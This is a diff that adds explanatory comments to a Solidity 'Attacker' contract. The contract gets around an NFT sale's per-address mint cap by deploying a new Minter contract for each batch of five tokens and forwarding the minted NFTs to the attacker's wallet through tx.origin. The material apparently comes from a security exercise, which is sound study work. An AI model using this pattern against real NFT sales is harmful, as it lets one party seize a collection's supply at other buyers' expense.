@@ -12,9 +12,11 @@ contract Attacker {
     }
 
     function attack() private {
+        //Due to the fact that each address can just mint 5 NFTS we're going to create a new contract for each batch of 5 NFTS
         uint256 end = (victim.collectionSize() /
             victim.maxPerAddressDuringMint()) + 1;
         for (uint256 i = 0; i < end; i++) {
+            //If there a more than 5 NFTS left we're going to mint 5, otherwise we're going to mint the remaining NFTS
             uint256 quantity = victim.collectionSize() - victim.totalSupply() >
                 victim.maxPerAddressDuringMint()
                 ? victim.maxPerAddressDuringMint()
@@ -43,8 +45,10 @@ contract Minter {
     }
 
     function mint() private {
+        //Mint the given amount of NFTS
         victim.publicSaleMint{value: msg.value}(quantity);
         for (uint256 i = 0; i < quantity; i++) {
+            //Send them to the attacker EOA using tx.origin
             victim.transferFrom(
                 address(this),
                 tx.origin,
